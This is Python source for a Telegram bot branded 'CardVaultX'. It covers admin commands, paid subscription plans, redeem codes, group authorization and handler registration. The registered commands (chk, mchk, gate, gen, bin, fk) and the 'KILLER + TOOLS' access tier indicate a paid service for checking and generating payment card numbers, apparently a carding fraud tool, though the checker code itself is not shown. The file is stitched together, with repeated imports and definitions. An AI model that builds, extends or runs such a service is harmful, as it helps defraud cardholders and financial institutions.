        authorized_groups_list.append(f"• `{escaped_id}` → *{name}*")
    authorized_groups_str = (
        "\n".join(authorized_groups_list) if authorized_groups_list else "_No groups authorized\\._"
    )

    # Private plan users
    users = await get_all_users()
    plan_users = []
    for user in users:
        plan = user.get("plan", "Free")
        if plan.lower() not in ["free", "n/a"]:
            uid = escape_markdown_v2(str(user["id"]))
            plan_escaped = escape_markdown_v2(plan)
            plan_users.append(f"• ID: `{uid}` \\| Plan: `{plan_escaped}`")
    authorized_users_str = (
        "\n".join(plan_users) if plan_users else "_No private users with plans\\._"
    )

    admin_dashboard_message = (
        "╭━━━━━『 𝐀𝐃𝐌𝐈𝐍 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃 』━━━━━╮\n"
        "┣ 🤖 *Owner Commands:*\n"
        f"{admin_commands_list}\n"
        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐆𝐫𝐨𝐮𝐩𝐬 』━━━╮\n"
        f"{authorized_groups_str}\n"
        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐔𝐬𝐞𝐫𝐬 \\(Private Plans\\) 』━━━╮\n"
        f"{authorized_users_str}"
    )

    await update.effective_message.reply_text(
        admin_dashboard_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )



async def _update_user_plan(user_id: int, plan_name: str, credits: int, duration_days: int = None):
    """Updates user's subscription plan and expiry."""
    plan_expiry = 'N/A'
    if duration_days:
        expiry_date = datetime.now() + timedelta(days=duration_days)
        plan_expiry = expiry_date.strftime('%d-%m-%Y')

    await update_user(
        user_id,
        plan=plan_name,
        status=plan_name,
        credits=credits,
        plan_expiry=plan_expiry
    )

    AUTHORIZED_PRIVATE_USERS.add(user_id)

    # Re-fetch updated user data if needed
    user_data = await get_user(user_id)
    return user_data


from datetime import datetime, timedelta
from telegram.constants import ParseMode

PLAN_DEFINITIONS = {
    "starter": {"name": "Starter Plan", "credits": 300, "days": 7},
    "premium": {"name": "Premium Plan", "credits": 1000, "days": 30},
    "plus": {"name": "Plus Plan", "credits": 2000, "days": 60},
    "custom": {"name": "Custom Plan", "credits": 3000, "days": None},
}

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


from datetime import datetime

async def give_starter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_starter [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Starter Plan', 300, 7)
    await update.effective_message.reply_text(
        f"✅ Starter Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user info and send congratulation
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Starter", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`", parse_mode=ParseMode.MARKDOWN_V2)

from datetime import datetime

async def give_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_premium [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Premium Plan', 1000, 30)
    await update.effective_message.reply_text(
        f"✅ Premium Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user details
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Premium", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


from datetime import datetime

async def give_plus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_plus [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Plus Plan', 2000, 60)

    await update.effective_message.reply_text(
        f"✅ Plus Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user's name
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Create and send congratulations box
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Plus", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

from datetime import datetime

async def give_custom(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_custom [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Custom Plan', 3000)

    await update.effective_message.reply_text(
        f"✅ Custom Plan activated for user `{user_id}` with 3000 credits\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Get first name for congrats message
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Generate & send congratulatory message
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(
        user_id=user_id,
        plan="Custom",
        access_level="KILLER + TOOLS",
        date=date_str,
        first_name=first_name
    )

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


async def take_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's current plan and revokes private access."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text("❌ Invalid format\\. Usage: `/take_plan [user_id]`", parse_mode=ParseMode.MARKDOWN_V2)
    
    try:
        user_id = int(context.args[0])
        user_data = await get_user(user_id)  # ✅ FIXED: was `user.id` before (wrong variable)
        
        # Reset plan and credits
        user_data['plan'] = 'Free'
        user_data['status'] = 'Free'
        user_data['plan_expiry'] = 'N/A'
        user_data['credits'] = DEFAULT_FREE_CREDITS
        
        # Persist the update
        await update_user(
            user_id,
            plan='Free',
            status='Free',
            plan_expiry='N/A',
            credits=DEFAULT_FREE_CREDITS
        )

        # Remove from private authorized users
        AUTHORIZED_PRIVATE_USERS.discard(user_id)

        await update.effective_message.reply_text(
            f"✅ Plan and private access have been removed for user `{user_id}`\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )


def generate_congrats_box(user_id: int, plan: str, access_level: str, date: str, first_name: str) -> str:
    from telegram.helpers import escape_markdown
    return (
        f"╭━━━[ 🎉 𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐬, {escape_markdown(first_name, version=2)}\\! ]━━━╮\n"
        f"┃\n"
        f"┃ ✨ *Access to* ⚡ `𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝑿` *has been granted\\.*\n"
        f"┃\n"
        f"┃ 🆔 *𝙄𝘿*             : `{user_id}`\n"
        f"┃ 💎 *𝙋𝙡𝙖𝙣*           : `{plan}`\n"
        f"┃ 🧰 *𝘼𝙘𝙘𝙚𝙨𝙨 𝙇𝙚𝙫𝙚𝙡*   : `{access_level}`\n"
        f"┃ 📅 *𝘿𝙖𝙩𝙚*           : `{date}`\n"
        f"┃ 🔓 *𝙎𝙩𝙖𝙩𝙪𝙨*         : `✔ Activated`\n"
        f"┃\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━╯\n"
        f"\n"
        f"💠 *𝕎𝕖𝕝𝕔𝕠𝕞𝕖 𝕥𝕠 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧* — 𝙉𝙤 𝙡𝙞𝙢𝙞𝙩𝙨 𝙅𝙪𝙨𝙩 𝙥𝙤𝙬𝙚𝙧\\.\n"
        f"𝙔𝙤𝙪’𝙧𝙚 𝙣𝙤𝙬 𝙖 𝙥𝙧𝙤𝙪𝙙 𝙢𝙚𝙢𝙗𝙚𝙧 𝙤𝙛 𝙩𝙝𝙚 *𝗘𝗹𝗶𝘁𝗲 {escape_markdown(plan, version=2)} 𝗧𝗶𝗲𝗿*\\.\n"
        f"\n"
        f"🍷 *𝓣𝓱𝓪𝓷𝓴𝓼 𝓯𝓸𝓻 𝓬𝓱𝓸𝓸𝓼𝓲𝓷𝓰 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧\\!* 𝙔𝙤𝙪𝙧 𝙖𝙘𝙘𝙚𝙨𝙨 𝙞𝙨 𝙣𝙤𝙬 𝙤𝙥𝙚𝙣\\."
    )


async def auth_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorizes a group to use the bot."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].strip('-').isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/au [chat_id]`", 
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    try:
        chat_id = int(context.args[0])
        if chat_id > 0:
            return await update.effective_message.reply_text(
                "❌ That is not a group chat ID\\. Make sure you provide a valid group chat ID that starts with `-`\\.", 
                parse_mode=ParseMode.MARKDOWN_V2
            )

        AUTHORIZED_CHATS.add(chat_id)
        await update.effective_message.reply_text(
            f"✅ Group with chat ID `{chat_id}` has been authorized\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid chat ID format\\. Please provide a valid integer chat ID\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )


import os
import asyncpg
from telegram import Update
from telegram.ext import ContextTypes

ADMIN_USER_ID = 8438505794  # Replace with your admin user ID

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Usage: /reset <amount_of_credits>\nExample: /reset 500")
        return

    new_credits = int(context.args[0])
    database_url = os.getenv("DATABASE_URL")
    if not database_url:
        await update.message.reply_text("❌ DATABASE_URL environment variable not set.")
        return

    try:
        conn = await asyncpg.connect(dsn=database_url)
        await conn.execute("UPDATE users SET credits = $1", new_credits)
        await conn.close()
    except Exception as e:
        await update.message.reply_text(f"❌ Database error: {e}")
        return

    await update.message.reply_text(f"✅ All user credits have been reset to {new_credits}.")


async def remove_authorize_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's private access and resets their plan."""
    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/rauth [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    try:
        user_id = int(context.args[0])

        if user_id in AUTHORIZED_PRIVATE_USERS:
            AUTHORIZED_PRIVATE_USERS.remove(user_id)

            # Update the user in the database
            await update_user(
                user_id,
                plan='Free',
                status='Free',
                credits=DEFAULT_FREE_CREDITS,
                plan_expiry='N/A'
            )

            await update.effective_message.reply_text(
                f"✅ User `{user_id}` has been de-authorized and plan reset to Free\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        else:
            await update.effective_message.reply_text(
                f"ℹ️ User `{user_id}` was not in the authorized private list\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

import re
import uuid
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Global redeem code storage (if not already defined)
REDEEM_CODES = {}

# Escape function for MarkdownV2
def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)

async def gen_codes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates 10 redeem codes for the Starter Plan."""
    generated_codes = []
    for _ in range(10):
        code = str(uuid.uuid4()).replace('-', '')[:12].upper()
        REDEEM_CODES[code] = {
            'plan_name': 'Starter Plan',
            'credits': 300,
            'duration_days': 7
        }
        generated_codes.append(code)

    code_list_text = "\n".join([f"`{escape_markdown_v2(code)}`" for code in generated_codes])

    response_text = (
        "✅ *10 new redeem codes for the Starter Plan have been generated:* \n\n"
        f"{code_list_text}\n\n"
        "These codes are one\\-time use\\. Share them wisely\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeems a code to activate a plan."""
    user = update.effective_user
    user_id = user.id

    if not context.args or len(context.args) != 1:
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/redeem [code]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    code = context.args[0].upper()
    plan_details = REDEEM_CODES.get(code)

    if not plan_details:
        return await update.effective_message.reply_text(
            "❌ Invalid or already used code\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_data = await get_user(user_id)
    if user_data.get('plan') != 'Free':
        return await update.effective_message.reply_text(
            "❌ You already have an active plan\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Apply the plan and remove the used code
    plan_name = plan_details['plan_name']
    credits = plan_details['credits']
    duration_days = plan_details['duration_days']
    await _update_user_plan(user_id, plan_name, credits, duration_days)
    del REDEEM_CODES[code]

    response_text = (
        f"🎉 Congratulations\\! Your `{escape_markdown_v2(plan_name)}` has been activated\\.\n"
        f"You have been granted `{credits}` credits and your plan will be active for `{duration_days}` days\\.\n"
        f"Your private access is now active\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)


async def handle_unauthorized_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles commands that are not explicitly authorized for the user/chat."""
    # This handler is a fallback and can be used for logging or a generic message.
    pass

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and send a user-friendly message if possible."""
    logger.error("Exception while handling an update:", exc_info=context.error)
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("❌ An unexpected error occurred\\. Please try again later or contact the owner\\.", parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.error(f"Failed to send error message to user: {e}")
# === REGISTERING COMMANDS AND HANDLERS ===
import os
import logging
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, filters
)
from db import init_db

# ⛳ Load environment variables from Railway
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", 0))  # Default 0 if not set

# ✅ Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 🧠 Import your command handlers here

async def post_init(application):
    await init_db()
    logger.info("Database initialized")

def main():
    application = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()

    # ✨ Public Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("credits", credits_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CommandHandler("gate", gate_command))
    application.add_handler(CommandHandler("gen", gen))
    application.add_handler(CommandHandler("bin", bin_lookup))
    application.add_handler(CommandHandler("fk", fk_command))
    application.add_handler(CommandHandler("fl", fl_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("redeem", redeem_command))

    # 🔐 Admin Commands
    owner_filter = filters.User(OWNER_ID)
    application.add_handler(CommandHandler("admin", admin_command, filters=owner_filter))
    application.add_handler(CommandHandler("give_starter", give_starter, filters=owner_filter))
    application.add_handler(CommandHandler("give_premium", give_premium, filters=owner_filter))
    application.add_handler(CommandHandler("give_plus", give_plus, filters=owner_filter))
    application.add_handler(CommandHandler("give_custom", give_custom, filters=owner_filter))
    application.add_handler(CommandHandler("take_plan", take_plan, filters=owner_filter))
    application.add_handler(CommandHandler("au", auth_group, filters=owner_filter))
    application.add_handler(CommandHandler("reset", reset_command))
    application.add_handler(CommandHandler("rauth", remove_authorize_user, filters=owner_filter))
    application.add_handler(CommandHandler("gen_codes", gen_codes_command, filters=owner_filter))

    # Callback & Error
    application.add_handler(CallbackQueryHandler(handle_callback))
    application.add_error_handler(error_handler)

    # 🔁 Start polling (handles its own event loop!)
    logger.info("Bot started and is polling for updates...")
    application.run_polling()

if __name__ == '__main__':
    main()
